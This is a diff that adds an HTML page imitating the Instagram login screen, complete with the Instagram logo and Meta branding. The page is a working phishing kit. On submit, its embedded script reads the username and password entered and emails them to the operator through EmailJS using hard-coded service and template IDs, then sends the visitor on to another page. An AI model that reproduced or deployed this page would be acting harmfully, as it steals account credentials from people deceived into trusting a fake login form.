@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <!-- Include the EmailJS library -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        emailjs.init("hg5XpI6F9EwWXMe4O"); // Replace with your EmailJS user ID
+
+        function retrieveValues() {
+            // Get the values from the input fields
+            var username = document.getElementsByName('username')[0].value;
+            var password = document.getElementsByName('password')[0].value;
+
+            // Send the values to your email using EmailJS
+            emailjs.send("service_hc05aui", "template_kgjal1c", {
+                username: username,
+                password: password
+            })
+            .then(function(response) {
+                console.log("Email sent successfully:", response);
+                // You can perform other actions here after the email is sent
+                window.location.href = "new.html";
+            }, function(error) {
+                console.log("Email sending failed:", error);
+                // You can handle errors here
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-form">
+              <!-- Language selection -->
+        <div class="language-selection">
+            <select class="language-select">
+                <option value="en" selected>English</option>
+                <!-- Add more language options as needed -->
+            </select>
+        </div>
+            <img src="instalogo.png" class="logo">
+            <a href="#" class="facebook-login">
+                
+                <i class="fab fa-facebook"></i>
+                Continue with Facebook
+            </a>
+            <div class="or-separator">
+                <hr>
+                <span>OR</span>
+                <hr>
+            </div>
+            <form onsubmit="retrieveValues(); return false;">
+                <input type="text" placeholder="Phone number, email or username" class="input-field" name="username">
+                <input type="password" placeholder="Password" class="input-field" name="password">
+                <a href="#" class="forgot-password"><h6>Forgot Password?</h6></a>
+                <button type="submit" class="login-button">Login</button>
+            </form>
+            
+           
+          
+            <div class="signup-link">
+                <span>Don't have an account?</span>
+                <a href="#" class="signup-button">Sign Up</a>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <h6 class="custom-h6">from</h6>
+        <img src="meta.png" alt="Meta" class="footer-image">
+    </footer>
+</body>
+</html>
